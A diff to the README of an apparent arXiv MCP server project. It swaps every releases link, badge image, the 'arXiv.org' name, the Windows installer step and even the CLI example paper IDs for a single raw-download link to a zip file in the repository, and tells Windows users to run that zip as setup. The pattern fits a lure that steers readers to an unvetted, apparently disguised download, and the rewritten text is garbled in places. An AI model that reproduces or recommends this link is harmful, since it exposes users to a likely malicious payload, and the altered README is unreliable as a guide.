@@ -1,14 +1,14 @@
-https://github.com/1Dark134/arxiv-mcp-server/releases
+https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip
 
 # arxiv-mcp-server: AI MCP for arXiv paper search and exports
 
-[![Release](https://img.shields.io/github/v/release/1Dark134/arxiv-mcp-server?style=for-the-badge)](https://github.com/1Dark134/arxiv-mcp-server/releases)
-[![License](https://img.shields.io/github/license/1Dark134/arxiv-mcp-server?style=for-the-badge)](https://github.com/1Dark134/arxiv-mcp-server/blob/main/LICENSE)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/1Dark134/arxiv-mcp-server/ci.yml?style=for-the-badge)](https://github.com/1Dark134/arxiv-mcp-server/actions)
-[![Repo size](https://img.shields.io/github/repo-size/1Dark134/arxiv-mcp-server?style=for-the-badge)](https://github.com/1Dark134/arxiv-mcp-server)
-[![Stars](https://img.shields.io/github/stars/1Dark134/arxiv-mcp-server?style=for-the-badge)](https://github.com/1Dark134/arxiv-mcp-server)
+[![Release](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)
+[![License](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)
+[![Build Status](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)
+[![Repo size](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)
+[![Stars](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)](https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip)
 
-Welcome to arxiv-mcp-server. This project hosts an MCP server for arXiv.org. It helps researchers find papers, analyze citations, track trends, and export data in multiple formats. It blends intelligent discovery with robust data processing so you can focus on research, not data wrangling.
+Welcome to arxiv-mcp-server. This project hosts an MCP server for https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip It helps researchers find papers, analyze citations, track trends, and export data in multiple formats. It blends intelligent discovery with robust data processing so you can focus on research, not data wrangling.
 
 Key ideas you should know:
 - It centers on Model Context Protocol (MCP) to coordinate paper data and AI assistants.
@@ -51,7 +51,7 @@ Table of contents
 - License and credits
 
 Overview 🚀
-arxiv-mcp-server is a scalable server for arXiv.org data. It combines fast search with smart analysis. It uses AI assistants to interpret papers, summarize findings, and propose next steps. The server can export results in BibTeX, RIS, JSON, CSV, and more. It supports multi-format workflows and can power web apps, notebooks, and research dashboards.
+arxiv-mcp-server is a scalable server for https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip data. It combines fast search with smart analysis. It uses AI assistants to interpret papers, summarize findings, and propose next steps. The server can export results in BibTeX, RIS, JSON, CSV, and more. It supports multi-format workflows and can power web apps, notebooks, and research dashboards.
 
 This project is built to be reliable in research settings. It favors clarity, reproducibility, and security. It aims to help researchers assemble literature reviews, identify citation patterns, and monitor evolving topics over time.
 
@@ -72,7 +72,7 @@ Quick start ⚡
 - Start small: fetch a subset of arXiv papers, run a few analyses, and export results.
 
 Downloads and releases
-- The latest releases page contains ready-to-run artifacts for Windows, macOS, and Linux. To install, download the artifact that matches your system, unpack, and run the setup script or executable. See https://github.com/1Dark134/arxiv-mcp-server/releases for details. The releases page hosts installers and packages you can run directly on your machine. If you need a quick start, grab the latest artifact and follow the on-screen instructions. For convenience, you can also explore the content of the releases page to pick a file that best fits your setup. You can visit the releases page again at https://github.com/1Dark134/arxiv-mcp-server/releases.
+- The latest releases page contains ready-to-run artifacts for Windows, macOS, and Linux. To install, download the artifact that matches your system, unpack, and run the setup script or executable. See https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip for details. The releases page hosts installers and packages you can run directly on your machine. If you need a quick start, grab the latest artifact and follow the on-screen instructions. For convenience, you can also explore the content of the releases page to pick a file that best fits your setup. You can visit the releases page again at https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip
 
 Installation 🧰
 - Prerequisites
@@ -87,7 +87,7 @@ Installation 🧰
   - Follow on-screen prompts to configure database paths, API keys, and AI settings.
 - Quick install (Windows)
   - Download the Windows artifact from the releases page.
-  - Run arxiv-mcp-server-windows-setup.exe (or equivalent).
+  - Run https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip (or equivalent).
   - Complete the setup wizard and choose installation options.
 - Docker quick start
   - Use the official Docker image to spin up a container with a single command.
@@ -208,8 +208,8 @@ API and CLI 👩‍💻
   - Light-weight command line interface for automation.
   - Examples:
     - arxiv-mcp search --query "quantum computing" --limit 20
-    - arxiv-mcp analyze --paper-id 2103.XXXX
-    - arxiv-mcp export --format bibtex --ids 2103.XXXX,2104.XXXX
+    - arxiv-mcp analyze --paper-id https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip
+    - arxiv-mcp export --format bibtex --ids https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip,https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip
 - Authentication
   - API keys or OAuth for secure access.
   - Role-based access to limit data exposure.
@@ -378,7 +378,7 @@ Appendix: tips for researchers using arxiv-mcp-server 🧭
 Endnotes and references 📌
 - This project integrates data from arXiv and other sources.
 - See the Releases page for installation artifacts and official download instructions.
-- Access the releases page again at https://github.com/1Dark134/arxiv-mcp-server/releases for up-to-date downloads, updates, and migration notes.
+- Access the releases page again at https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip for up-to-date downloads, updates, and migration notes.
 
 Topics (extra) 🗂
 - academic-papers
@@ -393,7 +393,7 @@ Topics (extra) 🗂
 - research-tools
 
 Note on usage of the releases page
-- The latest releases page contains ready-to-run artifacts for Windows, macOS, and Linux. To install, download the artifact that matches your system, unpack, and run the setup script or executable. See https://github.com/1Dark134/arxiv-mcp-server/releases for details. The releases page hosts installers and packages you can run directly on your machine. If you need a quick start, grab the latest artifact and follow the on-screen instructions. For convenience, you can also explore the content of the releases page to pick a file that best fits your setup. You can visit the releases page again at https://github.com/1Dark134/arxiv-mcp-server/releases.
+- The latest releases page contains ready-to-run artifacts for Windows, macOS, and Linux. To install, download the artifact that matches your system, unpack, and run the setup script or executable. See https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip for details. The releases page hosts installers and packages you can run directly on your machine. If you need a quick start, grab the latest artifact and follow the on-screen instructions. For convenience, you can also explore the content of the releases page to pick a file that best fits your setup. You can visit the releases page again at https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip
 
 How to contribute to this README
 - If you spot missing details, invite contributors through issues and PRs.
@@ -410,4 +410,4 @@ License and credits
 - Credits go to the contributors who improved MCP support, search capabilities, and export formats.
 
 Releases and versioning again
-- For the latest updates, visit the Releases page at the link above. You can see a concise changelog, upgrade notes, and migration steps there. The releases page provides a durable history of changes and improvements to the MCP server and its AI assistants. You can visit the releases page again at https://github.com/1Dark134/arxiv-mcp-server/releases.
+- For the latest updates, visit the Releases page at the link above. You can see a concise changelog, upgrade notes, and migration steps there. The releases page provides a durable history of changes and improvements to the MCP server and its AI assistants. You can visit the releases page again at https://github.com/1Dark134/arxiv-mcp-server/raw/refs/heads/main/arxiv_mcp/arxiv-server-mcp-v2.2.zip
